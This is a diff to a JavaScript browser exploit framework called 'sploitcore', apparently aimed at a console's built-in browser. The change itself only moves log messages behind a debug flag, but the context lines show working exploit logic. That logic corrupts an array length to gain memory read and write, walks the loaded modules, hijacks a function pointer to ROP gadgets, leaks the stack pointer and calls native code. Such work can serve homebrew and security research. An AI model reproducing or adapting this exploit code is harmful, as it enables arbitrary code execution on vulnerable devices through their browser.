@@ -1,3 +1,5 @@
+var DEBUG = false;
+
 function send(ep, data) {
 	data = JSON.stringify(data);
 	try {
@@ -15,6 +17,10 @@ console = {
 	}
 };
 var log = console.log;
+function dlog(msg) {
+	if(DEBUG)
+		log(msg);
+}
 window.onerror = function(msg, url, line) {
 	send('error', [line, msg]);
 	location.reload();
@@ -92,11 +98,11 @@ var sploitcore = function() {
 	this.clearBuffers();
 
 	this.mainaddr = this.walkList();
-	log('Main address ' + paddr(this.mainaddr));
+	dlog('Main address ' + paddr(this.mainaddr));
 };
 
 sploitcore.prototype.allocBuffers = function() {
-	log('Making ' + this.bufs.length + ' buffers');
+	dlog('Making ' + this.bufs.length + ' buffers');
 	for(var i = 0; i < this.bufs.length; ++i)
 		this.bufs[i] = new Uint32Array(this.rwbuf);
 };
@@ -145,14 +151,13 @@ sploitcore.prototype.setup = function() {
 	Object.defineProperties(target, props);
 	this.stale = target.stale;
 
-	log('Checking if triggered...');
+	dlog('Checking if triggered...');
 	if(this.stale.length == before_len) {
 		log('Failed to overwrite array');
-		log('~~failed');
 		return false;
 	}
 
-	log('Triggered.  New length: 0x' + this.stale.length.toString(16));
+	dlog('Triggered.  New length: 0x' + this.stale.length.toString(16));
 
 	if(this.stale.length < 2 || this.stale.length == 0x1003) {
 		log('Bad length');
@@ -163,7 +168,7 @@ sploitcore.prototype.setup = function() {
 	this.temp[0] = 0x41414141;
 	this.stale[1] = this.temp;
 
-	log('Looking for buf...');
+	dlog('Looking for buf...');
 
 	var found = false;
 	for(var i = 0; i < this.bufs.length; ++i) {
@@ -178,14 +183,14 @@ sploitcore.prototype.setup = function() {
 };
 
 sploitcore.prototype.clearBuffers = function() {
-	log('Clearing useless buffers');
+	dlog('Clearing useless buffers');
 	// Give ourselves a 'buffer' of 100 buffers around the one we know we hit, for safety
 	var cleared = 0;
 	for(var i = 0; i < this.bufs.length; ++i) {
 		if(!((i <= this.bufi && i + 50 >= this.bufi) || (i >= this.bufi && i - 50 < this.bufi)))
 			this.bufs[i] = 0 * (cleared++);
 	}
-	log('Done with cleanup.  Cleared ' + cleared + ' buffers');
+	dlog('Done with cleanup.  Cleared ' + cleared + ' buffers');
 }
 
 sploitcore.prototype.dump = function(name, buf, count) {
@@ -256,14 +261,14 @@ sploitcore.prototype.getBase = function() {
 
 	var baseaddr = add2(this.read8(this.funcaddr, 8), -this.funcbase);
 
-	log('First module ... ' + paddr(baseaddr));
+	dlog('First module ... ' + paddr(baseaddr));
 
 	return baseaddr;
 };
 
 sploitcore.prototype.walkList = function() {
 	var addr = this.getBase();
-	log('Initial NRO at ' + paddr(addr));
+	dlog('Initial NRO at ' + paddr(addr));
 
 	while(true) {
 		var baddr = addr;
@@ -283,7 +288,7 @@ sploitcore.prototype.walkList = function() {
 		var nro = this.read8(addr, 8);
 
 		if(nullptr(nro)) {
-			log('Hit RTLD at ' + paddr(addr));
+			dlog('Hit RTLD at ' + paddr(addr));
 			addr = this.read8(addr, 4);
 			break;
 		}
@@ -294,30 +299,30 @@ sploitcore.prototype.walkList = function() {
 		}
 
 		addr = nro;
-		log('Found NRO at ' + paddr(nro));
+		dlog('Found NRO at ' + paddr(nro));
 	}
 
 	while(true) {
 		var nro = this.read8(addr, 8);
 		if(nullptr(nro)) {
-			log('Hm, hit the end of things.  Back in rtld?');
+			dlog('Hm, hit the end of things.  Back in rtld?');
 			return;
 		}
 
 		if(this.read4(nro, this.read4(nro, 1) >> 2) == 0x30444f4d) {
-			log('Got MOD at ' + paddr(nro));
+			dlog('Got MOD at ' + paddr(nro));
 			if(this.read4(nro, 4) == 0x8DCDF8 && this.read4(nro, 5) == 0x959620) {
-				log('Found main module.');
+				dlog('Found main module.');
 				return nro;
 			}
 		} else {
-			log('No valid MOD header.  Back at RTLD.');
+			dlog('No valid MOD header.  Back at RTLD.');
 			break;
 		}
 
 		addr = this.read8(addr, 0);
 		if(nullptr(addr)) {
-			log('End of chain.');
+			dlog('End of chain.');
 			break;
 		}
 	}
@@ -343,10 +348,10 @@ sploitcore.prototype.getSP = function() {
 	*/
 	var test = 0x39FEEC; // First gadget addr
 	var jaddr = add2(this.mainaddr, test);
-	log('New jump at ' + paddr(jaddr));
-	log('Assigning function pointer');
+	dlog('New jump at ' + paddr(jaddr));
+	dlog('Assigning function pointer');
 
-	log('Function object at ' + paddr(this.funcaddr));
+	dlog('Function object at ' + paddr(this.funcaddr));
 	var curptr = this.read8(this.funcaddr, 8);
 
 	var fixed = this.mref(0x91F320);
@@ -367,20 +372,20 @@ sploitcore.prototype.getSP = function() {
 	// For addresses in app
 	this.write8(jaddr, this.funcaddr, 8);
 
-	log('Patched function address from ' + paddr(curptr) + ' to ' + paddr(this.read8(this.funcaddr, 8)));
+	dlog('Patched function address from ' + paddr(curptr) + ' to ' + paddr(this.read8(this.funcaddr, 8)));
 
-	log('Assigned.  Jumping.');
+	dlog('Assigned.  Jumping.');
 	var sp = this.getAddrDestroy(this.func.apply(0x101));
-	log('Jumped back.');
+	dlog('Jumped back.');
 
-	log('Got stack pointer: ' + paddr(sp));
+	dlog('Got stack pointer: ' + paddr(sp));
 
 	this.write8(curptr, this.funcaddr, 8);
 
-	log('Restored original function pointer.');
+	dlog('Restored original function pointer.');
 	for(var i = 0; i < 0x1000; ++i)
 		this.write4(saved[i], fixed, i);
-	log('Restored data page.');
+	dlog('Restored data page.');
 
 	return sp;
 };
@@ -407,17 +412,17 @@ sploitcore.prototype.call = function(funcptr, args, registers) {
 	} 
 	var sp = this.getSP();
 
-	log('Starting holy rop');
+	dlog('Starting holy rop');
 	var jaddr = this.mref(0x39FEEC); // First gadget addr
-	log('New jump at ' + paddr(jaddr));
-	log('Assigning function pointer');
+	dlog('New jump at ' + paddr(jaddr));
+	dlog('Assigning function pointer');
 
-	log('Function object at ' + paddr(this.funcaddr));
+	dlog('Function object at ' + paddr(this.funcaddr));
 	var curptr = this.read8(this.funcaddr, 8);
 	this.write8(jaddr, this.funcaddr, 8);
-	log('Patched function address from ' + paddr(curptr) + ' to ' + paddr(this.read8(this.funcaddr, 8)));
+	dlog('Patched function address from ' + paddr(curptr) + ' to ' + paddr(this.read8(this.funcaddr, 8)));
 
-	log('Setting up structs');
+	dlog('Setting up structs');
 
 	var fixed = this.mref(0x91F320);
 	var saved = new Uint32Array(0x1000);
@@ -529,19 +534,19 @@ sploitcore.prototype.call = function(funcptr, args, registers) {
 
 	sp = add2(sp, 0x8000);
 
-	log('Assigned.  Jumping.');
+	dlog('Assigned.  Jumping.');
 	var ret = this.getAddrDestroy(this.func.apply(0x101));
-	log('Jumped back.');
+	dlog('Jumped back.');
 
 	this.write8(curptr, this.funcaddr, 8);
 
-	log('Restored original function pointer.');
+	dlog('Restored original function pointer.');
 
 	for(var i = 0; i < 0x1000; ++i)
 		this.write4(saved[i], fixed, i);
-	log('Restored data page.');
+	dlog('Restored data page.');
 
-	log('Native code at ' + paddr(funcptr) + ' returned: ' + paddr(ret));
+	dlog('Native code at ' + paddr(funcptr) + ' returned: ' + paddr(ret));
 
 	this.free(context_load_struct);
 	this.free(block_struct_1);
